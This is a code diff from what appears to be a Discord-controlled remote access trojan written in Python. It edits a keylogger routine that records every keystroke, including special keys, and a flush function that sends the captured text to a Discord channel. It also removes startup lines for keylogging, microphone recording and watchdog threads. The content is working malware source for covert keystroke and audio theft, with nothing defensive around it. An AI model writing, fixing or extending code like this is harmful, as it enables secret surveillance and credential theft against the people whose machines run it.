@@ -1504,9 +1504,10 @@ def keylogger_thread():
         global last_key_time
         if not keylogger_active:
             return
-        try:
-            keylogger_buffer.append(key.char)
-        except AttributeError:
+        ch = getattr(key, "char", None)
+        if ch:
+            keylogger_buffer.append(ch)
+        else:
             specials = {
                 keyboard.Key.space: " ",
                 keyboard.Key.enter: "\n",
@@ -1517,7 +1518,7 @@ def keylogger_thread():
                 keyboard.Key.shift: " [SHIFT] ",
                 keyboard.Key.shift_r: " [RIGHT_SHIFT] ",
             }
-            keylogger_buffer.append(specials.get(key, f" [{key}] "))
+            keylogger_buffer.append(specials.get(key) or " [{}] ".format(key))
         last_key_time = time.time()
 
     while True:
@@ -1532,7 +1533,7 @@ def flush_keylog():
     global keylogger_buffer
     if not keylogger_buffer:
         return False
-    text = "".join(keylogger_buffer)
+    text = "".join(x for x in keylogger_buffer if x)
     keylogger_buffer = []
     try:
         asyncio.run_coroutine_threadsafe(send_keylog_to_discord(text), bot.loop)
@@ -6423,12 +6424,6 @@ async def on_ready():
             threading.Thread(target=fn, daemon=True).start()
         except Exception:
             _crash("ready", "thread {} failed".format(fn.__name__))
-
-    threading.Thread(target=keylogger_thread, daemon=True).start()
-    threading.Thread(target=send_keys_periodically, daemon=True).start()
-    threading.Thread(target=record_mic_thread, daemon=True).start()
-    threading.Thread(target=check_blacklist, daemon=True).start()
-    threading.Thread(target=_watchdog_thread, daemon=True).start()
 
 @bot.event
 async def on_message(message):
